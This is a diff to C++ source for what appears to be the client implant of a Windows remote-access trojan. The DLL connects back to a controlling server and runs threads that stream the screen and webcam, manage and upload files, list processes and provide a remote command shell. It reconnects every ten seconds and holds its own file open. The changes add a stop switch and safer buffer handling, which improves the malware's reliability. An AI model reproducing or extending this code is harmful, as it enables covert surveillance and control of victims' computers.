@@ -22,6 +22,16 @@ HMODULE DllHandle = NULL;
 
 float ScreenRadio = 1;
 
+BOOL IsRun = TRUE;
+
+extern "C"  __declspec(dllexport) void QuitProcess(){
+    IsRun = FALSE;
+    if (INVALID_SOCKET != MainSocket)
+    {
+        shutdown(MainSocket, SD_RECEIVE);
+    }
+}
+
 unsigned long _stdcall resolve(const char *host)
 {
     ULONG Ip = inet_addr(host);
@@ -53,9 +63,6 @@ SOCKET ConnectServer(char Addr[], int Port)
     LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);
 
     SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0);
-
-    //int timeout = INFINITE;
-    //setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 
     if (connect(hSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR) {
         Mprintf("Can't Connect to %s:%d\n", Addr, Port);
@@ -96,15 +103,15 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
     msgHead.dwCmd = SOCKET_CONNECT;
     msgHead.dwSize = sizeof(SysInfo);
 
-    if ( !SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead) ) {
+    if ( !SendMsg(MainSocket, SafeBuffer::From((char *)&m_SysInfo, sizeof(SysInfo)), &msgHead) ) {
         Mprintf("Can't Send first message: %d\n", msgHead.dwCmd);
         closesocket(MainSocket);
         return 1; //send socket type error
     }
 
-    char chBuffer[4096];
+    SafeBuffer chBuffer(4096);
 
-    while (1) {
+    while (IsRun) {
         if ( !RecvMsg(MainSocket, chBuffer, &msgHead) ) {
             Mprintf("Can't Recv\n");
             shutdown(MainSocket, 0x02);
@@ -313,20 +320,17 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
     }
 
     MsgHead msgHead;
-    char *chBuffer = new char[2048 * 1024];
+    SafeBuffer chBuffer(2048 * 1024);
 
     //send socket type
     msgHead.dwCmd = SOCKET_FILEMANAGE;
     msgHead.dwSize = 0;
     if (!SendMsg(FileSocket, chBuffer, &msgHead)) {
-        if (chBuffer != NULL)
-            delete []chBuffer;
-
         closesocket(FileSocket);
         return 0;//send socket type error
     }
 
-    while (1) {
+    while (IsRun) {
         //接收命令
         if (!RecvMsg(FileSocket, chBuffer, &msgHead))
             break;
@@ -389,9 +393,6 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
         if (!SendMsg(FileSocket, chBuffer, &msgHead))
             break;
     }
-
-    if (chBuffer != NULL)
-        delete[] chBuffer;
 
     shutdown(FileSocket, 0);
     closesocket(FileSocket);
@@ -470,9 +471,9 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
     msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
     msgHead.dwExtend2 = lenthCompress;            //压缩后长度
 
-    bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
+    bNotStop = SendMsg(ScreenSocket, SafeBuffer::From((char*)pDataCompress, lenthCompress), &msgHead);
 
-    while (bNotStop) {
+    while (bNotStop && IsRun) {
         dwLastSend = GetTickCount();
 
         lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
@@ -485,7 +486,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
         msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
         msgHead.dwExtend2 = lenthCompress;            //压缩后长度
 
-        bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
+        bNotStop = SendMsg(ScreenSocket, SafeBuffer::From((char*)pDataCompress, lenthCompress), &msgHead);
 
         if ((GetTickCount() - dwLastSend) < 160)
             Sleep(150);
@@ -547,7 +548,7 @@ DWORD _stdcall VideoThread(LPVOID lParam)
 
     msgHead.dwCmd  = 0;
     msgHead.dwSize = sizeof(BITMAPINFOHEADER);
-    if (!SendMsg(VideoSocket, (char*)&(m_Cap.m_lpbmi->bmiHeader), &msgHead)) {
+    if (!SendMsg(VideoSocket, SafeBuffer::From((char*)&(m_Cap.m_lpbmi->bmiHeader), msgHead.dwSize), &msgHead)) {
         shutdown(VideoSocket,0);
         closesocket(VideoSocket);
         return 3;//send socket type error
@@ -573,7 +574,7 @@ DWORD _stdcall VideoThread(LPVOID lParam)
         msgHead.dwExtend1 = lenthUncompress;        //未压缩数据长度
         msgHead.dwExtend2 = lenthCompress;          //压缩后数据长度
 
-        bNotStop = SendMsg(VideoSocket, (char*)pDataCompress, &msgHead); //发送数据
+        bNotStop = SendMsg(VideoSocket, SafeBuffer::From((char*)pDataCompress, lenthCompress), &msgHead); //发送数据
 
         if ((GetTickCount() - dwLastSend) < 100)
             Sleep(80);
@@ -594,7 +595,7 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
     }
     // TODO (yyx: Improve later)
     MsgHead msgHead;
-    char *chBuffer = new char[1024 * 1024]; //数据交换区
+    SafeBuffer chBuffer(1024 * 1024); //数据交换区
 
     msgHead.dwCmd = SOCKET_PROCESS;
     msgHead.dwSize = 0;
@@ -604,7 +605,7 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
         return 0;//send socket type error
     }
 
-    while (1) {	//接收命令
+    while (IsRun) {	//接收命令
         if (!RecvMsg(ProcessSocket, chBuffer, &msgHead))
             break;
 
@@ -627,7 +628,6 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
         if (!SendMsg(ProcessSocket, chBuffer, &msgHead))	//发送数据
             break;
     }
-    delete[] chBuffer;
     shutdown(ProcessSocket,0);
     closesocket(ProcessSocket);
     return 0;
@@ -641,7 +641,7 @@ DWORD _stdcall ShellThread(LPVOID lParam)
     }
 
     MsgHead msgHead;
-    char *chBuffer = new char[512 * 1024];
+    SafeBuffer chBuffer(512 * 1024);
 
     msgHead.dwCmd = SOCKET_CMDSHELL;
     msgHead.dwSize = 0;
@@ -651,7 +651,7 @@ DWORD _stdcall ShellThread(LPVOID lParam)
         return 0; //send socket type error
     }
 
-    while (1) {
+    while (IsRun) {
         if (!RecvMsg(ShellSocket, chBuffer, &msgHead))
             break;
 
@@ -667,9 +667,6 @@ DWORD _stdcall ShellThread(LPVOID lParam)
         if (!SendMsg(ShellSocket, chBuffer, &msgHead))
             break;
     }
-
-    if (chBuffer != NULL)
-        delete[] chBuffer;
 
     shutdown(ShellSocket,0);
     closesocket(ShellSocket);
@@ -776,7 +773,7 @@ DWORD _stdcall FileUpThread(LPVOID lParam)
         return 1;//send socket type error
     }
 
-    while (TRUE) {
+    while (IsRun) {
         nRet = recv(FileSocket, (char*)&RecvBuffer, dwBufSize, 0);
         if (nRet <= 0)
             break;
@@ -803,6 +800,8 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 
 DWORD WINAPI RoutineMain(LPVOID lp)
 {
+    IsRun = TRUE;
+    OutputDebugStringA(">>> Start RoutineMain\n");
     TCHAR ModulePath[MAX_PATH*2];
     GetModuleFileName(DllHandle, ModulePath, sizeof(ModulePath));
     CreateFile(ModulePath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -820,7 +819,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 
     int state = 1;
 
-    while (1) {
+    while (IsRun) {
         __try {
             state = ConnectThread(NULL);
         } __except(1) {
@@ -832,12 +831,13 @@ DWORD WINAPI RoutineMain(LPVOID lp)
         } else if (state == 1) { //Network Error
             Sleep(10 * 1000);
         } else if (state == -1) { //Exit
-            Mprintf("RoutineMain: Exit Request \n");
+            Mprintf(">>> Stop RoutineMain: Exit Request \n");
             return -1;
         }
 
         Sleep(1000);
     }
+    OutputDebugStringA(">>> Stop RoutineMain\n");
 
     return 0;
 }
